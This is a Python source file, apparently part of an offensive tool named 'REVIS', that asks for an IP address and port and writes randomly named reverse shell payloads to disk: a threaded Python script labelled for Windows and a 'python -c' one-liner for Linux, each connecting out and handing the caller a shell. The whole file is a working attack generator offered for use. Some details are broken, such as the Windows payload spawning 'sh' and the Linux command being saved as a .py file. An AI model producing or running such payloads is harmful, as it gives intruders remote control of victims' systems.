# Reverse shells for R E V I S. 
# Please NOTE: I did not make these reverse shells, I generated them using this website: https://www.revshells.com/

import string
from random import randrange 
import random

def windows():
    print("""
    R e v i s > Windows Payload


        """)
    ip_addr = input("Enter IP Addr: ")
    port = int(input("Enter PORT No: "))
    windows_payload = f"""

import os,socket,subprocess,threading;
def s2p(s, p):
    while True: 
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip_addr}",{port}))

p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
    """
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    payloadName = upper + lower
    length = 5

    name = ""
    for i in range(length):
        letters = random.choice(payloadName)
        name += letters
    with open(f"{name}.py", "w") as payload:
        payload.write(windows_payload)
    print(f"Payload generated: {name}.py")


def linux():
    ip_addr = input("Enter IP address. ")
    port = int(input("Enter Port No: "))
    linux_payload = f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_addr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
    """
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    payloadName = upper + lower
    length = 5

    name = ""
    for i in range(length):
        letters = random.choice(payloadName)
        name += letters
    with open(f"{name}.py", "w") as payload:
        payload.write(linux_payload)
    print(f"Payload generated: {name}.py")
    
def payloadSelection():
    choices = input("""

1) Windows Payload
2) Linux Payload



Payload Selection Menu: """)

    if choices == "1":
        windows()
    elif choices == "2":
        linux()

